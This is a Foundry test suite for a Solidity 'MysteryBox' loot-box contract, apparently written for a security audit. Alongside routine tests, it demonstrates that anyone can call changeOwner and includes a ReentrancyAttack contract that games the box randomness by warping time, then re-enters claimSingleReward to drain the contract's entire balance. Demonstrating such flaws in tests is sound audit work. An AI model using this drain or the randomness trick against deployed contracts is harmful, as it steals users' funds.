// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import "../src/MysteryBox.sol";

contract MysteryBoxTest is Test {
    uint256 public constant SEED_VALUE = 0.1 ether;
    MysteryBox public mysteryBox;
    address public owner;
    address public user1;
    address public user2;

    function setUp() public {
        owner = makeAddr("owner");
        user1 = address(0x1);
        user2 = address(0x2);

        vm.deal(owner, SEED_VALUE);
        vm.deal(user1, 1 ether);
        vm.deal(user2, 1 ether);
        vm.prank(owner);
        mysteryBox = new MysteryBox{value: SEED_VALUE}();
        console2.log("Reward Pool Length:", mysteryBox.getRewardPool().length);
    }

    function testOwnerIsSetCorrectly() public view {
        assertEq(mysteryBox.owner(), owner);
    }

    function testSetBoxPrice() public {
        uint256 newPrice = 0.2 ether;
        vm.prank(owner);
        mysteryBox.setBoxPrice(newPrice);
        assertEq(mysteryBox.boxPrice(), newPrice);
    }

    function testSetBoxPrice_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can set price");
        mysteryBox.setBoxPrice(0.2 ether);
    }

    function testAddReward() public {
        vm.prank(owner);
        mysteryBox.addReward("Diamond Coin", 2 ether);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewardPool();

        // for (uint8 i = 0; i < rewards.length; i++) {
        //     console2.log(rewards[i].name);
        //     console2.log(rewards[i].value);
        // }
        assertEq(rewards.length, 5);
        assertEq(rewards[4].name, "Diamond Coin");
        assertEq(rewards[4].value, 2 ether);
    }

    function testAddReward_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can add rewards");
        mysteryBox.addReward("Diamond Coin", 2 ether);
    }

    function testBuyBox() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        assertEq(mysteryBox.boxesOwned(user1), 1);
    }

    function testBuyBox_IncorrectETH() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        vm.expectRevert("Incorrect ETH sent");
        mysteryBox.buyBox{value: 0.05 ether}();
    }

    function testOpenBox() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();
        console2.log("Before Open:", mysteryBox.boxesOwned(user1));
        vm.prank(user1);
        mysteryBox.openBox();
        console2.log("After Open:", mysteryBox.boxesOwned(user1));
        assertEq(mysteryBox.boxesOwned(user1), 0);

        vm.prank(user1);
        MysteryBox.Reward[] memory rewards = mysteryBox.getRewards();
        console2.log(rewards[0].name);
        assertEq(rewards.length, 1);
    }

    function testOpenBox_NoBoxes() public {
        vm.prank(user1);
        vm.expectRevert("No boxes to open");
        mysteryBox.openBox();
    }

    function testTransferReward_InvalidIndex() public {
        vm.prank(user1);
        vm.expectRevert("Invalid index");
        mysteryBox.transferReward(user2, 0);
    }

    function testWithdrawFunds() public {
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        mysteryBox.buyBox{value: 0.1 ether}();

        uint256 ownerBalanceBefore = owner.balance;
        console2.log("Owner Balance Before:", ownerBalanceBefore);
        vm.prank(owner);
        mysteryBox.withdrawFunds();
        uint256 ownerBalanceAfter = owner.balance;
        console2.log("Owner Balance After:", ownerBalanceAfter);

        assertEq(ownerBalanceAfter - ownerBalanceBefore, 0.1 ether + SEED_VALUE);
    }

    function testWithdrawFunds_NotOwner() public {
        vm.prank(user1);
        vm.expectRevert("Only owner can withdraw");
        mysteryBox.withdrawFunds();
    }

    function testChangeOwner() public {
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

    function testChangeOwner_AccessControl() public {
        vm.prank(user1);
        mysteryBox.changeOwner(user1);
        assertEq(mysteryBox.owner(), user1);
    }

    modifier boxesBought() {
        uint256 boxPrice = mysteryBox.boxPrice();
        vm.prank(user1);
        for (uint8 i = 0; i < 3; i++) {
            mysteryBox.buyBox{value: boxPrice}();
        }
        _;
    }

    function testReentrancy_ClaimAllRewards() public boxesBought {
        ReentrancyAttack reentrancyAttack = new ReentrancyAttack(mysteryBox);
        uint256 attackCost = 0.5 ether;

        uint256 initBalAttackerContract = address(reentrancyAttack).balance;
        uint256 initBalContract = address(mysteryBox).balance;

        console2.log("Initial bal attacker contract: ", initBalAttackerContract);
        console2.log("Initial bal contract: ", initBalContract);

        vm.prank(user2);
        reentrancyAttack.attack{value: attackCost}();

        uint256 finalBalContract = address(mysteryBox).balance;
        uint256 finalBalAttackerContract = address(reentrancyAttack).balance;
        console2.log("Final bal contract: ", finalBalContract);
        console2.log("Final bal reentracy contract: ", finalBalAttackerContract);

        assertEq(finalBalAttackerContract, initBalContract + attackCost);
        assertEq(finalBalContract, 0);
    }
}

contract ReentrancyAttack is Test {
    MysteryBox mysteryBox;
    uint256 rewardsValue;

    constructor(MysteryBox _mysteryBox) {
        mysteryBox = _mysteryBox;
    }

    function calculateRewardValue() public {
        MysteryBox.Reward[] memory myRewards = mysteryBox.getRewards();
        uint256 _rewardsValue = rewardsValue;

        for (uint8 i = 0; i < myRewards.length; i++) {
            _rewardsValue += myRewards[i].value;

            if (rewardsValue > 0) {
                break;
            }
        }

        rewardsValue = _rewardsValue;
    }

    function obtainReward() public payable {
        uint256 i = 0;

        while (rewardsValue <= 0) {
            mysteryBox.buyBox{value: 0.1 ether}();
            mysteryBox.openBox();
            calculateRewardValue();
            i++;
            console2.log("Attempt: ", i);
            vm.warp(i);
        }
    }

    // function attack() public payable {
    //     if (rewardsValue <= 0) {
    //         obtainReward();
    //     }

    //     if (address(mysteryBox).balance >= rewardsValue) {
    //         mysteryBox.claimAllRewards();
    //     }
    // }

    function attack() public payable {
        if (rewardsValue <= 0) {
            obtainReward();
        }

        if (address(mysteryBox).balance >= rewardsValue) {
            uint256 index = mysteryBox.getRewards().length - 1;
            mysteryBox.claimSingleReward(index);
        }
    }

    receive() external payable {
        attack();
    }

    fallback() external payable {
        attack();
    }
}
